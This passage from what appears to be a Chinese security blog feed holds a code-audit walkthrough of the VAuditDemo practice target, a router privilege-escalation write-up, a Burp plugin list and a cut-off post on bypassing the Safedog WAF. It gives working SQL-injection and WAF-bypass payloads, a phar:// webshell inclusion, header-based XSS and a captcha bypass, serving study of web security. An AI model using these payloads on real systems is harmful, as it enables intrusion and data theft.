          <category> web安全 </category>
          
          <category> 漏洞挖掘 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vauditdemo代码审计记录</title>
      <link href="2019/12/02/vauditdemo-codeview/"/>
      <url>2019/12/02/vauditdemo-codeview/</url>
      
        <content type="html"><![CDATA[<h2 id="vauditDemo代码审计"><a href="#vauditDemo代码审计" class="headerlink" title="vauditDemo代码审计"></a>vauditDemo代码审计</h2><p>本片博客记录vauditDemo的代码审计过程，初学代码审计，记录下来方便回看。vauditDemo地址：<a href="https://github.com/virink/VAuditDemo">https://github.com/virink/VAuditDemo</a>, 这个是大牛virink写的一款练习代码审计的靶场，作者本人也有配套的视频教程，配合食用，味道更佳。</p><h2 id="通读源码"><a href="#通读源码" class="headerlink" title="通读源码"></a>通读源码</h2><p>对于这种代码不是很多的CMS,通读源码未尝不是一个好方法，在读源码的过程中能够更好的了解整个CMS的架构以及业务逻辑，为接下来的代码审计铺平道路。靶场作者在课上也提到了这种方法。</p><h3 id="靶场整体框架"><a href="#靶场整体框架" class="headerlink" title="靶场整体框架"></a>靶场整体框架</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">├── about.inc                                     ---说明信息├── admin                                           ---管理员目录│   ├── captcha.php│   ├── delAdmin.php│   ├── delUser.php│   ├── index.php│   ├── logCheck.php│   ├── login.php│   ├── manageAdmin.php│   ├── manageCom.php│   ├── manage.php│   ├── manageUser.php│   ├── php_errors.log│   └── ping.php├── css                                                   --- css文件│   ├── bootstrap.css│   ├── bootstrap.min.css│   ├── bootswatch.less│   ├── bootswatch.min.css│   └── variables.less├── footer.php                              ---页脚├── header.php                           ----页头├── images                                    ---图片目录│   └── default.jpg├── index.php                              ---入口文件├── <span class="token function">install</span>                                      ---安装文件│   ├── install.php│   └── install.sql├── js                                               ---js文件│   ├── bootstrap.min.js│   ├── bootswatch.js│   ├── bsa.js│   └── check.js├── messageDetail.php           ---留言详情页面├── message.php                       ---留言页面├── messageSub.php               ---留言页面├── search.php                           ----搜索页面├── sys                                            ---配置目录│   ├── config.php│   ├── install.lock│   └── lib.php├── uploads                              -----图片上传目录└── user                                     -----普通用户目录    ├── avatar.php    ├── edit.php    ├── logCheck.php    ├── login.php    ├── logout.php    ├── regCheck.php    ├── reg.php    ├── updateAvatar.php    ├── updateName.php    ├── updatePass.php    └── user.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>1.入口文件index.php</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/2019-12-2-17-8-52" alt="2019-12-2-17-8-52"></p><p>首先包含了config.php和header.php，然后就是包含了关于页面，入口文件很简单，没啥好说的，但要注意的是这里存在<code>include</code>函数，可能有任意文件包含的风险。</p><p>2.配置文件config.php</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/2019-12-2-17-17-48" alt="2019-12-2-17-17-48"></p><p>检查当前目录下是否存在install.lock文件，不存在的话就跳转到install.php页面，然后包含了<code>lib.php</code>文件，数据库的配置信息也在此文件中。</p><p>3.lib.php</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/2019-12-2-17-22-50" alt="2019-12-2-17-22-50"></p><p>此文件下主要是一些过滤函数用来过滤用户输入，这些过滤函数可能存在bypass的可能。</p><blockquote><p>注意这里的sec函数对全局GET,POST,COOKIE等输入做了过滤。</p></blockquote><p>4.header.php</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/2019-12-2-17-24-39" alt="2019-12-2-17-24-39"></p><p>根据session判断是普通用户还是管理员，将其的名字显示到页面上，然后就是登录和注册链接。</p><p>5.reg.php</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/2019-12-2-17-32-4" alt="2019-12-2-17-32-4"></p><p>主要是一些表单信息，信息提交到regCheck.php去做校验。</p><p>6.regCheck.php</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/2019-12-2-17-44-28" alt="2019-12-2-17-44-28"></p><p>使用clean_input函数过滤了用户注册的用户名和密码，防止注册含有特殊字符的用户名，这里可以考虑bypass <code>clean_input</code>函数。</p><p>7.user.php</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/2019-12-3-10-49-28" alt="2019-12-3-10-49-28"></p><p>根据username从数据库中查询对应的userid。</p><p>8.message.php</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/2019-12-3-10-56-38" alt="2019-12-3-10-56-38"></p><p>从数据库中获取留言信息展示到页面上，这里的用户名和留言内容都使用了<code>htmlspecialchars</code>转义，基本排除了留言板存在xss的可能。</p><p>9.messagesub.php</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/2019-12-3-11-0-13" alt="2019-12-3-11-0-13"></p><p>将用户留言信息插入到数据库中，使用cleaninput函数过滤了留言信息，但是这里可能存在bypass注入。</p><p>10.search.php</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/2019-12-3-11-4-38" alt="2019-12-3-11-4-38"></p><p>根据用户输入搜索留言，这里使用了<code>sec</code>函数对用户输入进行了过滤。</p><p>以上就是重要代码的通读，接下来详解每个漏洞的形成过程。</p><h2 id="安装问题"><a href="#安装问题" class="headerlink" title="安装问题"></a>安装问题</h2><p>此靶场在使用前需要先安装，其实安装就是创建数据库并写入一些sql语句的过程，此安装文件在判断数据库已经安装完成后并未直接退出，导致下面的代码依旧可以执行，存在敏感信息泄露。</p><p><strong>install.php</strong></p><p><img src="https://raw.githubusercontent.com/handbye/images/master/2019-12-3-11-18-21" alt="2019-12-3-11-18-21"></p><p><strong>复现：</strong></p><p>使用burpsuite抓包，访问install.php,查看响应结果。</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/2019-12-3-14-26-41" alt="2019-12-3-14-26-41"></p><p>render后的结果：</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/2019-12-3-14-27-16" alt="2019-12-3-14-27-16"></p><p>可看到已经泄露了一些敏感信息。</p><h2 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h2><p>在admin目录下有一个ping.php文件，这个页面的功能是在后台执行ping命令。</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/2019-12-3-17-7-20" alt="2019-12-3-17-7-20"></p><p>执行正常的命令：</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/2019-12-3-17-9-10" alt="2019-12-3-17-9-10"></p><p>查看<strong>ping.php</strong>文件：</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/2019-12-3-17-10-3" alt="2019-12-3-17-10-3"></p><p>代码并未对<code>target</code>做任何过滤，这样就可以进行命令拼接从而达到命令执行的效果。</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/2019-12-3-17-11-30" alt="2019-12-3-17-11-30"></p><h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><p>全局搜索查看可能存在注入的语句：</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/2019-12-3-17-44-38" alt="2019-12-3-17-44-38"></p><p>转到<strong>messageDetail.php</strong>：</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/2019-12-3-17-47-4" alt="2019-12-3-17-47-4"></p><p>使用sqlwaf函数对id进行了过滤，查看sqlwaf函数：</p><p>转到<strong>lib.php</strong>：</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/2019-12-3-17-48-28" alt="2019-12-3-17-48-28"></p><p>这个函数对常见的sql注入语句进行了替换。</p><p>这里将<code>||</code>替换为空字符串，那不就可以使用<code>sele||ct</code>这种方式去绕过对<code>select</code>的过滤。</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/2019-12-3-22-33-54" alt="2019-12-3-22-33-54"></p><h2 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h2><p><img src="https://raw.githubusercontent.com/handbye/images/master/2019-12-4-10-53-48" alt="2019-12-4-10-53-48"></p><p>有个管理员可以查看普通用户的用户名和ip地址的页面，我们看下用户名和ip地址分别是怎么获取的。</p><p>转到<strong>manageUser.php</strong>:</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/2019-12-4-10-56-29" alt="2019-12-4-10-56-29"></p><p>是从数据库中查询出来的，但是用户名经过了<code>htmlspecialchars</code>的转义，继续查找ip地址是怎么传入数据库的。</p><p>转到<strong>logCheck.php</strong>:</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/2019-12-4-11-2-4" alt="2019-12-4-11-2-4"></p><p>login_ip是使用<code>get_client_ip</code>函数获取的，并且经过了<code>sqlwaf</code>函数的过滤。</p><p>继续查看<code>get_client_ip</code>函数：</p><p>转到<strong>lib.php</strong>:</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/2019-12-4-11-3-49" alt="2019-12-4-11-3-49"></p><p>此函数从http头信息中提取<code>HTTP_CLIENT_IP</code>或者<code>HTTP_X_FORWARDED_FOR</code>等可以标记客户端地址的字段。</p><p>那么就可以伪造这些信息，进而达到xss的效果。</p><p>修改http头中的Client-IP值：</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/2019-12-4-12-40-30" alt="2019-12-4-12-40-30"></p><p>普通用户登录后这个值就会保存到数据库中，当管理员去后台查看时，这个值就会展示到页面上，进而引起XSS.</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/2019-12-4-12-42-41" alt="2019-12-4-12-42-41"></p><p><img src="https://raw.githubusercontent.com/handbye/images/master/2019-12-4-12-44-5" alt="2019-12-4-12-44-5"></p><h2 id="登录爆破"><a href="#登录爆破" class="headerlink" title="登录爆破"></a>登录爆破</h2><p>管理员的登录页面存在验证码，当需要爆破密码进行登录时就需要识别验证码或者绕过验证码。</p><p>转到<strong>admin/login.php</strong>:</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/2019-12-4-12-52-52" alt="2019-12-4-12-52-52"></p><p>验证码是由<code>captcha.php</code>生成的，继续转到<strong>admin/logCheck.php</strong>:</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/2019-12-4-13-8-19" alt="2019-12-4-13-8-19"></p><p>可以看到提交的验证码是与session中的验证码作比较的，而session中的验证码是由captcha.php生成的。</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/2019-12-4-13-9-49" alt="2019-12-4-13-9-49"></p><p>若果不让其访问captcha.php，那<code>$_SESSION[&#39;captcha&#39;]</code>=null , 这样不就绕过了验证码的限制吗？</p><p>登录并使用burp抓包：</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/2019-12-4-13-15-49" alt="2019-12-4-13-15-49"></p><p>将请求包中的Cookie删除，这样重放的时候新seesion中的$_SESSION[‘captcha’]就会为空，所以也需要把captcha参数删除。</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/2019-12-4-13-25-17" alt="2019-12-4-13-25-17"></p><p>将验证码和Cookie去掉，重放跳转到manage页面，说明绕过验证码成功，接下来就是正常的去爆破了。</p><h2 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h2><p>转到<strong>avatar.php</strong>：</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/2019-12-4-13-41-36" alt="2019-12-4-13-41-36"></p><p>存在<code>file_get_contents</code>函数，这个函数控制不好的话就会造成任意文件读取的发生。</p><p>跟踪<code>$_SESSION[&#39;avatar&#39;]</code>来到user/logCheck.php。</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/2019-12-4-13-48-25" alt="2019-12-4-13-48-25"></p><p><code>$_SESSION[&#39;avatar&#39;]</code>是从数据库中获取的，继续跟踪<code>user_avatar</code>看其是怎么插入到数据库中的。</p><p>来到<strong>updateAvatar.php</strong>中发现了其插入语句：</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/2019-12-4-13-52-46" alt="2019-12-4-13-52-46"></p><p>变量<code>$avatar</code>是由上传路径+时间戳+文件名三部分组成的，其中文件名是可控的。</p><p>构造payload :</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token string single-quoted-string">', user_avatar = '</span><span class="token operator">.</span><span class="token operator">.</span><span class="token operator">/</span>sys<span class="token operator">/</span>config<span class="token operator">.</span>php<span class="token string single-quoted-string">' WHERE user_name = '</span>test'<span class="token comment">#.png  ,</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>将avatar更改为<code>../sys/config.php</code>即可读取这个文件的内容。</p><p>burp抓取头像上传的数据包然后改包：</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/2019-12-4-14-43-47" alt="2019-12-4-14-43-47"></p><p>上传后发现数据库中的数据变成了这样的：</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/2019-12-4-14-44-31" alt="2019-12-4-14-44-31"></p><p>原因是文件名中不能包含路径信息，将文件名转换为16进制，重新上传。</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/2019-12-4-14-55-9" alt="2019-12-4-14-55-9"></p><p>这样就成功了：</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/2019-12-4-14-55-40" alt="2019-12-4-14-55-40"></p><p>接下来登录然后读取头像文件就可以看到config.php文件的内容。</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/2019-12-4-15-21-49" alt="2019-12-4-15-21-49"></p><p>同样这个任意文件读取也可以访问任意外部链接的内容，从而达到SSRF的效果。</p><h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><p>转到**index.php,**使用了<code>include</code>函数包含about.inc文件。</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/2019-12-4-15-41-52" alt="2019-12-4-15-41-52"></p><p>这里限制了后缀只能是<code>.inc</code>格式的，可以尝试使用伪协议绕过，关于伪协议的使用请参考：<a href="https://lorexxar.cn/2016/09/14/php-wei/">https://lorexxar.cn/2016/09/14/php-wei/</a></p><p>我这里使用<code>phar</code>伪协议。</p><p>在上传文件处上传一个一句话木马，注意需要将木马文件后缀该为<code>.inc</code>，并将其压缩，压缩文件后缀该为<code>.png</code>格式。</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/2019-12-4-15-47-17" alt="2019-12-4-15-47-17"></p><p>上传test.png，观察其上传时间，并将这个时间转换为时间戳：</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/2019-12-4-15-51-50" alt="2019-12-4-15-51-50"></p><p>上传文件的名字是按照如下规则重命名的：</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/2019-12-4-15-53-7" alt="2019-12-4-15-53-7"></p><p>所以我们上传的文件为：<code>/uploads/u_1575446707_test.png</code></p><p>使用phar读取压缩包里面的test.inc文件：</p><p>payload为：<code>phar://uploads/u_1575446707_test.png/test</code></p><p><img src="https://raw.githubusercontent.com/handbye/images/master/2019-12-4-16-6-38" alt="2019-12-4-16-6-38"></p><p>成功上传一句话并执行命令成功。</p><h2 id="越权"><a href="#越权" class="headerlink" title="越权"></a>越权</h2><p>后台有个更改用户名的地方，我们来看看这里是否存在越权的问题：</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/2019-12-4-16-21-22" alt="2019-12-4-16-21-22"></p><p>跟踪<strong>edit.php</strong>来到<strong>updateName.php</strong>:</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/2019-12-4-16-22-32" alt="2019-12-4-16-22-32"></p><p><img src="https://raw.githubusercontent.com/handbye/images/master/2019-12-4-16-23-25" alt="2019-12-4-16-23-25"></p><p>在<strong>updateName.php</strong>中发现了一个奇怪的问题，更新用户名时竟然不从session中获取user_id,而是可以接收用户post的id。这样就导致了可以修改任意用户用户名的越权问题。</p><p>来修改下用户sss的用户名：</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/2019-12-4-16-27-57" alt="2019-12-4-16-27-57"></p><p><img src="https://raw.githubusercontent.com/handbye/images/master/2019-12-4-16-36-58" alt="2019-12-4-16-36-58"></p><p><img src="https://raw.githubusercontent.com/handbye/images/master/2019-12-4-16-37-18" alt="2019-12-4-16-37-18"></p><p>可看到已将其用户名修改。</p><h2 id="二次截断注入"><a href="#二次截断注入" class="headerlink" title="二次截断注入"></a>二次截断注入</h2><p>二次注入简而言之就是在存在单引号的情况下，利用双条件查询，利用前一个条件去闭合单引号，后一个条件就可以成为我们的payload。这里的关键是闭合单引号。</p><p>来到<strong>messageSub.php</strong>:</p><p>这个页面处理用户的留言信息，会将用户的留言信息提交到数据库中，使用了<code>clean_input</code>函数，但是并未使用<code>sqlwaf</code>函数过滤用户输入。</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/2019-12-4-16-58-51" alt="2019-12-4-16-58-51"></p><p><code>cleaninput</code>这个函数很奇怪，先是使用了<code>stripslashes</code>删除反斜杠，然后又使用<code>mysql_real_escape_string()</code>给特殊字符加上反斜杠。O__O “…</p><p>如果我们能够注册一个用户名里面包含<code>\</code>,那就可以闭合valves中的第一个单引号，后面就可以插入payload的了。</p><p>payload为：<code>,(select user()),now());#</code></p><p>来到<strong>regCheck.php</strong>:</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/2019-12-4-21-27-5" alt="2019-12-4-21-27-5"></p><p>使用<code>clean_input</code>函数过滤了用户名。</p><p>我们注册一个<code>abcd\</code>用户：</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/2019-12-4-21-31-30" alt="2019-12-4-21-31-30"></p><p><img src="https://raw.githubusercontent.com/handbye/images/master/2019-12-4-21-32-33" alt="2019-12-4-21-32-33"></p><p>界面显示的是<code>abcd\\</code>,查看数据库是<code>abcd\</code>,说明用户名已注册成功。</p><p>然后退出重新登陆：</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/2019-12-4-21-35-44" alt="2019-12-4-21-35-44"></p><p>页面显示error,不必理会，现在已经登陆成功了。</p><p>在留言页面填写payload：</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/2019-12-4-23-26-49" alt="2019-12-4-23-26-49"></p><p>留言成功后，留言板即可显示payload执行的结果：</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/2019-12-4-23-27-46" alt="2019-12-4-23-27-46"></p><p>至此全部漏洞的代码审计已经说明完毕，代码审计本是一个复杂的过程，文中有没说清楚的可结合视频学习。</p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vauditdemo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>deepin 微信图片打开空白解决办法</title>
      <link href="2019/11/29/deepin-wechat-img-issue/"/>
      <url>2019/11/29/deepin-wechat-img-issue/</url>
      
        <content type="html"><![CDATA[<p>在ubuntu上安装deepin微信后，打开别人发送的图片是空白的，无法显示。</p><p>网上查了下，deepin论坛给的解决办法如下：</p><p><a href="https://bbs.deepin.org/forum.php?mod=viewthread&tid=156161">https://bbs.deepin.org/forum.php?mod=viewthread&amp;tid=156161</a></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">sudo apt-get update &amp;&amp; sudo apt-get install deepin-wine deepin-wine-helper libjpeg62-turbo:i386<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>但是我在ubuntu18.04上安装libjpeg62是提示找不到此安装包。</p><p>所以我在网上找了一个安装包手动安装后，重启微信问题解决。</p><p>libjpeg62-turbo:i386安装包地址：<br><a href="https://debian.pkgs.org/10/debian-main-i386/libjpeg62-turbo_1.5.2-2+b1_i386.deb.html">https://debian.pkgs.org/10/debian-main-i386/libjpeg62-turbo_1.5.2-2+b1_i386.deb.html</a></p><blockquote><p>注意安装i386的安装包时，如果原来机器上安装有adm64的，需要先卸载amd64的。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 日常 </category>
          
          <category> bug解决 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> deepin </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>burpsuite常用插件介绍</title>
      <link href="2019/11/11/burpsuite-plugins/"/>
      <url>2019/11/11/burpsuite-plugins/</url>
      
        <content type="html"><![CDATA[<h2 id="JSON-amp-HTTPP"><a href="#JSON-amp-HTTPP" class="headerlink" title="JSON&amp;HTTPP"></a>JSON&amp;HTTPP</h2><p>此插件可以互相转换JSON和HTTP</p><p>用法：</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20191111165951.png" alt="20191111165951.png"></p><p>将需要转换的http数据放到插件中转换即可：</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20191111170147.png" alt="20191111170147.png"></p><h2 id="Knife"><a href="#Knife" class="headerlink" title="Knife"></a>Knife</h2><p>功能很多，详见：<a href="https://github.com/bit4woo/knife/blob/master/README-zh.md">https://github.com/bit4woo/knife/blob/master/README-zh.md</a></p><h2 id="burp-collector"><a href="#burp-collector" class="headerlink" title="burp collector"></a>burp collector</h2><p>可以使用burpsuite来构建字典，从而发现更多隐形资产。</p><p>github地址：<a href="https://github.com/TEag1e/BurpCollector">https://github.com/TEag1e/BurpCollector</a></p><h2 id="Bypass-WAF"><a href="#Bypass-WAF" class="headerlink" title="Bypass WAF"></a>Bypass WAF</h2><p>如其名，可以绕过一些waf</p><p>使用方法详见：<a href="https://www.codewatch.org/blog/?p=408">https://www.codewatch.org/blog/?p=408</a></p><h2 id="chunked-coding-converter"><a href="#chunked-coding-converter" class="headerlink" title="chunked-coding-converter"></a>chunked-coding-converter</h2><p>此插件可以利用分块传输原来烧过WAF，详见：<a href="https://github.com/c0ny1/chunked-coding-converter">https://github.com/c0ny1/chunked-coding-converter</a></p><h2 id="httpsmuggler"><a href="#httpsmuggler" class="headerlink" title="httpsmuggler"></a>httpsmuggler</h2><p>此插件也可用来绕过WAF，详见：<a href="https://github.com/nccgroup/BurpSuiteHTTPSmuggler">https://github.com/nccgroup/BurpSuiteHTTPSmuggler</a></p><h2 id="reCAPTCHA"><a href="#reCAPTCHA" class="headerlink" title="reCAPTCHA"></a>reCAPTCHA</h2><p>一款验证码识别爆破工具，使用方法见：<a href="https://github.com/bit4woo/reCAPTCHA/blob/master/README.md">https://github.com/bit4woo/reCAPTCHA/blob/master/README.md</a></p><h2 id="jsEncrypter"><a href="#jsEncrypter" class="headerlink" title="jsEncrypter"></a>jsEncrypter</h2><p>可调用js加密函数对数据进行加密，方面对加密了的参数进行fuzz和爆破，使用方法参考：<a href="https://github.com/c0ny1/jsEncrypter">https://github.com/c0ny1/jsEncrypter</a></p><h2 id="sqlmap4burp"><a href="#sqlmap4burp" class="headerlink" title="sqlmap4burp++"></a>sqlmap4burp++</h2><p>burpsuite调用sqlmap进行注入验证，用法请见：<a href="https://github.com/c0ny1/sqlmap4burp-plus-plus">https://github.com/c0ny1/sqlmap4burp-plus-plus</a></p><p>更多插件请看这里：<a href="https://github.com/Mr-xn/BurpSuite-collections">https://github.com/Mr-xn/BurpSuite-collections</a></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
          <category> 安全工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> burpsuite </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>烽火MR820网关的一处越权</title>
      <link href="2019/10/15/Mr820-pentest/"/>
      <url>2019/10/15/Mr820-pentest/</url>
      
        <content type="html"><![CDATA[<h2 id="无聊引发的渗透"><a href="#无聊引发的渗透" class="headerlink" title="无聊引发的渗透"></a>无聊引发的渗透</h2><p>在外出差，为了打发无聊时间只能拿路由器开刀了，连上WIFI后查看地址，然后nmap扫一波。</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20191015220853.png" alt="20191015220853.png"></p><p>只开放了80端口</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20191015221119.png" alt="20191015221119.png"></p><p>然后web登录，是下面这个页面</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20191015221202.png" alt="20191015221202.png"></p><p>使用admin用户登录密码错误后会提示密码错误，使用其它用户登录会提示不存在此用户，可以确定存在admin用户</p><p>无奈测试多次后也无法猜对admin的密码。</p><h2 id="一处越权"><a href="#一处越权" class="headerlink" title="一处越权"></a>一处越权</h2><p>然后去路由器上看了下，背面贴着user用户的账号和密码····</p><p>然后就使用user用户登录，发现url是这样的：</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20191015230141.png" alt="20191015230141.png"></p><p>user用户的权限较低：</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20191015230238.png" alt="20191015230238.png"></p><p>尝试把url中的user换成admin，出现404.</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20191015230342.png" alt="20191015230342.png"></p><p>尝试把url中的user去掉，发现此时已越权至admin用户，有较大权限。</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20191015230509.png" alt="20191015230509.png"></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
          <category> 逻辑漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 越权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>bypass安全狗</title>
      <link href="2019/10/08/bypass-safedog/"/>
      <url>2019/10/08/bypass-safedog/</url>
      
        <content type="html"><![CDATA[<h2 id="安全狗防护基本方法"><a href="#安全狗防护基本方法" class="headerlink" title="安全狗防护基本方法"></a>安全狗防护基本方法</h2><p>本次使用的安全狗版本为：V4.0 27338 IIS 正式版，是官网截止2019年10月8号的最新版本，本篇文章主要介绍sql注入突破。</p><h3 id="sql注入防护"><a href="#sql注入防护" class="headerlink" title="sql注入防护"></a>sql注入防护</h3><p>在安全狗的默认防护规则中有一系列关于sql注入的防护</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20191008153228.png" alt="20191008153228.png"></p><p>当初发这些规则时就会被拦截，例如：</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20191008153332.png" alt="20191008153332.png"></p><h2 id="bypass-Sql注入防护"><a href="#bypass-Sql注入防护" class="headerlink" title="bypass Sql注入防护"></a>bypass Sql注入防护</h2><h3 id="绕过总结（图片来自网上）"><a href="#绕过总结（图片来自网上）" class="headerlink" title="绕过总结（图片来自网上）"></a>绕过总结（图片来自网上）</h3><p><img src="https://raw.githubusercontent.com/handbye/images/master/20191008154146.png" alt="20191008154146.png"></p><h3 id="绕过-and-1-1"><a href="#绕过-and-1-1" class="headerlink" title="绕过 and 1=1"></a>绕过 <code>and 1=1</code></h3><ol><li><p>直接使用<code>and -1=-1</code>绕过<br><img src="https://raw.githubusercontent.com/handbye/images/master/20191008213720.png" alt="20191008213720.png"></p></li><li><p>使用注释绕过，50000表示mysql的大版本号为5.0版本<br><img src="https://raw.githubusercontent.com/handbye/images/master/20191008213555.png" alt="20191008213555.png"><br>或者：<br><img src="https://raw.githubusercontent.com/handbye/images/master/20191008213654.png" alt="20191008213654.png"></p></li><li><p>使用减法或加法绕过，注意加号需要进行url编码<br><img src="https://raw.githubusercontent.com/handbye/images/master/20191008223515.png" alt="20191008223515.png"><br><img src="https://raw.githubusercontent.com/handbye/images/master/20191008223608.png" alt="20191008223608.png"></p></li><li><p>使用<code>&amp;&amp;</code>代替and，使用<code>true</code>代替<code>1=1</code><br><img src="https://raw.githubusercontent.com/handbye/images/master/20191008225210.png" alt="20191008225210.png"></p></li><li><p>其它绕过</p><table><thead><tr><th align="center">payload</th><th align="center">结果</th></tr></thead><tbody><tr><td align="center">and</td><td align="center">未拦截</td></tr><tr><td align="center">1=1</td><td align="center">未拦截</td></tr><tr><td align="center">and 1=1</td><td align="center">拦截</td></tr></tbody></table><p>说明只有and和<code>1=1</code>在一起时安全狗才会拦截,那就需要干扰安全狗将and和<code>1=1</code>使用一系列注释和特殊字符分开，例如：<code>/*!and/*/**//*!/*!1=1*/</code><br><img src="https://raw.githubusercontent.com/handbye/images/master/20191009103349.png" alt="20191009103349.png"></p></li></ol><h3 id="绕过order-by"><a href="#绕过order-by" class="headerlink" title="绕过order by"></a>绕过<code>order by</code></h3><table><thead><tr><th align="center">payload</th><th align="center">结果</th></tr></thead><tbody><tr><td align="center">order</td><td align="center">未拦截</td></tr><tr><td align="center">by</td><td align="center">未拦截</td></tr><tr><td align="center">order by</td><td align="center">拦截</td></tr></tbody></table><p>说明只有order和by在一起时安全狗才会拦截。</p><ol><li>使用<code>.</code>绕过<br> <img src="https://raw.githubusercontent.com/handbye/images/master/20191009151740.png" alt="20191009151740.png"></li><li>使用<code>%23%0a</code>绕过<br> <img src="https://raw.githubusercontent.com/handbye/images/master/20191009153514.png" alt="20191009153514.png"></li><li>fuzz出来的其它绕过方式,有很多，这里只举其中的5中方式<ul><li><code>/*!order /*!/*/**/by*/1,2,3,4</code></li><li><code>/*!order /*/*%/**/by*/1,2,3,4</code></li><li><code>/*!order /*/*/**/by*/1,2,3,4</code></li><li><code>/*!order /*!/*/**//**/by*/1,2,3,4</code></li><li><code>/*!order /*!/*/**//*/**/by*/1,2,3,4</code></li></ul></li></ol><h3 id="绕过union-select"><a href="#绕过union-select" class="headerlink" title="绕过union select"></a>绕过<code>union select</code></h3><table><thead><tr><th align="center">payload</th><th align="center">结果</th></tr></thead><tbody><tr><td align="center">union</td><td align="center">未拦截</td></tr><tr><td align="center">select</td><td align="center">未拦截</td></tr><tr><td align="center">union select</td><td align="center">拦截</td></tr></tbody></table><p>说明只有union和select在一起时安全狗才会拦截。</p><blockquote><p>安全狗对<code>union select</code>的过滤比较严，我只找到了一种绕过方法。</p></blockquote><ol><li>使用<code>--+aaaaaa%0a</code>绕过<br><img src="https://raw.githubusercontent.com/handbye/images/master/20191010151154.png" alt="20191010151154.png"></li></ol><h3 id="绕过select-from"><a href="#绕过select-from" class="headerlink" 